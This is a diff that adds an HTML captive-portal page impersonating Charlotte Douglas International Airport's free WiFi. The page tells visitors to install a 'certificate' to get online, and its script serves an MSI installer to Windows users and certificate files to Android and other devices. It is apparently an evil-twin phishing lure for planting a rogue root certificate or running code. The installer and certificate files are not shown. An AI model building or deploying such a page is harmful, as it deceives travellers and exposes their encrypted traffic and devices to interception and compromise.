@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CLT Free WiFi</title>
+    <script>
+        function detectOS() {
+            let a = document.getElementById('cert');
+
+            if (navigator.userAgent.indexOf("Win")!=-1) {
+                a.href = "CharlotteFreeWifi.msi";
+                a.download = "";
+            } else if (navigator.userAgent.indexOf("Android")!=-1) {
+                a.href = "charlotteandroid.cer";
+                a.download = "";
+            } else {
+                a.href = "charlotteios.pem";
+                a.download = "";
+            }
+        }
+
+        document.addEventListener("DOMContentLoaded", () => {
+            const cert = detectOS();
+            document.getElementById("cert-name").innerText = `${cert}`;
+        });
+    </script>
+    <style>
+
+        @font-face {
+            font-family: gibson;
+            src: url(./fonts/Fontspring-DEMO-gibson-semibold.otf);
+        }
+
+        body {
+            padding: 1vh 1vw;
+            margin: 2vh; 
+            justify-content: center;
+            background-color: rgb(42, 43, 43);
+            background-image: url(./imgs/CLTInterior.jpg);
+            background-repeat: no-repeat;
+            background-size: cover;
+            background-attachment: fixed;
+            background-position: center;
+        }
+
+        button{
+            font-family: gibson;
+            font-size: 2vw;
+            text-align: center;
+            text-align: center;
+            border: 4px solid lightskyblue;
+            border-radius: 6px;
+            background: none;
+            background-color: lightskyblue;
+            transition-duration: 0.4s;
+            padding: 1vh 1vw; 
+        }
+
+        button:hover{
+            background-color: white; 
+            border: 4px solid lightskyblue;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+
+        .text{
+            font-family: gibson;
+            font-size: 2vw; 
+            text-align: center; 
+            margin: 5px; 
+        }
+
+        section{
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            padding: 2vh 2vw;
+        }
+
+        .welctext{
+            font-family: gibson;
+            font-size: 5vw; 
+            text-align: center; 
+            margin: 0;
+            font-weight: bold;
+        }
+
+        div{
+            align-items: center;
+            justify-content: center;
+            background-color: rgb(255, 255, 255, .75);
+            border-radius: 20px;
+            padding: 5vh 2vw;
+        }
+
+    </style>
+</head>
+
+<body>
+    <section>
+        <div>
+            <section style = "padding: 0;">
+                <img src = "./imgs/cltlogo.png" style = "width: 300px; height: 80px;">
+            </section>
+
+            <section>
+                <p class="welctext">Welcome to the Charlotte Douglas International Airport.</p>
+            </section>
+
+            <p class = "text">Enjoy your free guest wireless access. </p>
+            <p class = "text">Please download and install this certificate to continue browsing the internet.</p>
+
+            <section style = "padding: 0;">
+                <img src = "./imgs/wifilogo.png" style = "width: 100px; height: 100px;">
+            </section>
+
+            <section style = "padding: .2vh, .2vw">
+                <a id = "cert">
+                    <button>  
+                        Accept and Connect
+                    </button>
+                </a>
+            </section>
+            <p class = "text">Once the certificate is installed, this page will automatically reload. Please be patient as the process can take a little while</p>
+        </div>
+    </section>
+</body>
+</html>
